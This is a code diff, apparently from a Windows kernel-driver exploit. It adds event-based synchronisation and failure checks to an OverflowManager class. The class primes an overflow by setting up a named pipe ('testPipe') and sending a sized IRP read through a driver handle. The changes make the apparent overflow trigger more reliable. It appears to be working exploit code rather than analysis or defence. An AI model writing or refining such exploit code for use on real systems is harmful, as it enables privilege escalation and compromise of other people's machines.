@@ -6,6 +6,8 @@ OverflowManager::OverflowManager(HANDLE hDevice)
 {
     driver = hDevice;
     overflowPrimed = false;
+    irpReadyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    irpFailedEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 }
 
 
@@ -20,6 +22,8 @@ void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
     chunkSize = tChunkSize;
     LPCSTR pipeName = "\\\\.\\pipe\\testPipe";
     sPipe = NULL;
+    if (irpReadyEvent) ResetEvent(irpReadyEvent);
+    if (irpFailedEvent) ResetEvent(irpFailedEvent);
 
     securityAttributes = { 0 };
     securityDescriptor = NULL;
@@ -42,6 +46,23 @@ void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
     std::thread([](HANDLE pipe) {ConnectNamedPipe(pipe, NULL); }, sPipe).detach();
     irpThread = std::thread(&OverflowManager::SendIRP, this);
 
+    if (irpReadyEvent && irpFailedEvent) {
+        HANDLE waitHandles[] = { irpReadyEvent, irpFailedEvent };
+        DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, 2000);
+        if (waitResult == WAIT_OBJECT_0 + 1) {
+            DEBUG_PRINT(" [!] Overflow IRP worker failed to open pipe handle\n");
+            DisconnectNamedPipe(sPipe);
+            CloseHandle(sPipe);
+            LocalFree(securityDescriptor);
+            if (irpThread.joinable())
+                irpThread.join();
+            return;
+        }
+        else if (waitResult == WAIT_TIMEOUT) {
+            DEBUG_PRINT(" [!] Timed out waiting for overflow IRP worker; continuing cautiously\n");
+        }
+    }
+
     overflowPrimed = true;
 }
 
@@ -53,6 +74,12 @@ void OverflowManager::SendIRP()
     WCHAR filePath[] = L"\\Device\\NamedPipe\\testPipe";
 
     UINT64 fileHandle = GetFileHandle(driver, filePath);
+    if (fileHandle == 0 || fileHandle == (UINT64)-1 || fileHandle == 0x26) {
+        if (irpFailedEvent) SetEvent(irpFailedEvent);
+        return;
+    }
+
+    if (irpReadyEvent) SetEvent(irpReadyEvent);
 
     ReadFileHandle(driver, (HANDLE)fileHandle, CalculateIRPSize(chunkSize));
 
